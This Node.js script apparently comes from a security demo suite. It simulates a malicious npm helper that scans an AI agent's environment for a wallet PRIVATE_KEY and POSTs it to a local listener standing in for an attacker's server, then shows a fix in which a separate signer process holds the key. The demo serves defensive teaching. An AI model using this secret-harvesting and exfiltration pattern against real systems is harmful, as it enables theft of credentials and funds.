// Attack #4: the key lives where every tool can read it (the fake "wallet security" npm
// packages, May 2026; gadgethumans-mcp). A helper the agent loads scans env/.env for the key
// and ships it off.
//   node demos/04-exfil.mjs           the key is in the agent's env: the helper exfiltrates it
//   node demos/04-exfil.mjs --fixed   the key lives in a separate signer process; env has nothing,
//                                      yet the agent can still sign through the signer over a unix socket
import { createServer } from "node:http";
import { spawn } from "node:child_process";
import { existsSync, unlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startChain, stopChain, deploy, roles, abis, send, read, walletFor, pub, keyOf, fmt, short, parseUnits } from "../lib/chain.mjs";
import { scan } from "../vendor/wallet-security-helper/index.mjs";
import { connectSigner } from "../lib/connect-signer.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "exfil-fixed" : "exfil", fixed ? "Key exfiltration, fixed" : "Key exfiltration");
await startChain();
const u = (n) => parseUnits(String(n), 6);
const usdc = await deploy("usdc");
await send(roles.owner, usdc, abis.usdc, "mint", [roles.agent.address, u(100)]);
const ownerBal = () => read(usdc, abis.usdc, "balanceOf", [roles.owner.address]);

// Our own exfil listener on 127.0.0.1:9999 (stands in for the attacker's server).
let received = "nothing found";
const listener = createServer((rq, rs) => {
  let body = ""; rq.on("data", (c) => (body += c)); rq.on("end", () => {
    const { found } = JSON.parse(body || "{}");
    received = found ? `PRIVATE_KEY=${short(found)}` : "nothing found";
    rs.end("ok");
  });
}).listen(9999, "127.0.0.1");
const LISTEN = "http://127.0.0.1:9999";

let signerProc, sock;
if (!fixed) {
  // The key sits in the agent process environment — exactly where the helper looks.
  process.env.PRIVATE_KEY = keyOf(roles.agent);
  t.note("agent process env: PRIVATE_KEY is set (the agent signs with it)");
  t.cmd("node agent.mjs   # loads 'wallet-security-helper'");
  await scan(LISTEN);
  t.warn("  helper scanned env/.env and POSTed what it found → 127.0.0.1:9999");
  // The agent could still do its real job and sign a transfer...
  const hash = await walletFor(roles.agent).writeContract({ address: usdc, abi: abis.usdc, functionName: "transfer", args: [roles.owner.address, u(100)] });
  await pub.waitForTransactionReceipt({ hash });
  t.note(`  (agent also signed a ${fmt(await ownerBal())} tUSDC transfer — the key works, and it leaked)`);
  t.bad("  the key is readable by every tool the agent loads");
} else {
  // The key is given ONLY to a separate signer process; the agent's own env has none.
  delete process.env.PRIVATE_KEY;
  sock = join(tmpdir(), `nt3-signer-${process.pid}.sock`);
  if (existsSync(sock)) unlinkSync(sock);
  signerProc = spawn("node", [new URL("../lib/signer-process.mjs", import.meta.url).pathname, sock, keyOf(roles.agent), usdc], { stdio: ["ignore", "pipe", "ignore"] });
  await new Promise((r) => signerProc.stdout.once("data", r)); // wait for "ready"
  t.note("signer process holds the key on a unix socket; agent env has none");
  t.cmd('node agent.mjs   # connectSigner("/tmp/signer.sock")');
  await scan(LISTEN);
  t.warn("  helper scanned env/.env and POSTed what it found → 127.0.0.1:9999");
  // The agent can still sign: it asks the signer, which holds the key, to move 100 tUSDC.
  const signer = connectSigner(sock);
  await signer.transfer(roles.owner.address, u(100));
  t.ok(`  agent signed through the signer: moved ${fmt(await ownerBal())} tUSDC`);
  t.note("  the key never enters the agent process");
}
await new Promise((r) => setTimeout(r, 100));
t.big(`EXFIL: ${received}`);
listener.close();
if (signerProc) { signerProc.kill("SIGTERM"); try { unlinkSync(sock); } catch {} }
t.save(); stopChain(); process.exit(0);
